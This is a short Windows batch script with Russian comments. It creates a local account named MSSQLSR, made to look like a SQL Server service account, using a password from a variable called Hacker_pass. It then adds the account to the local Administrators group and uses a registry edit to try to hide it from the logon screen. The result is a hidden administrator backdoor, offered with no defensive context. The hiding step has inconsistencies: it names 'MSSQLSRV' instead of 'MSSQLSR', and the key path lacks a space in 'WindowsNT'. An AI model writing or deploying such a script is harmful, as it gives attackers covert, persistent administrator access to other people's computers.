@echo off
rem Смена кодовой страницы (для корректного назначения учётных записей на кириллице)
chcp 1251
rem Добавление учётной записи MSSQLSR с паролем из переменной %Hacker_pass%
net user MSSQLSR %Hacker_pass% /add
rem Присвоение этой учётной записи полномочий локального администратора компьютера
net localgroup Администраторы MSSQLSR /add
net localgroup Administrators MSSQLSR /add
rem Попытка сделать эту учётную запись "невидимой" в Windows XP-7
REG ADD "HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList\MSSQLSRV" /v MSSQLSRV /t reg_dword /d 0000000
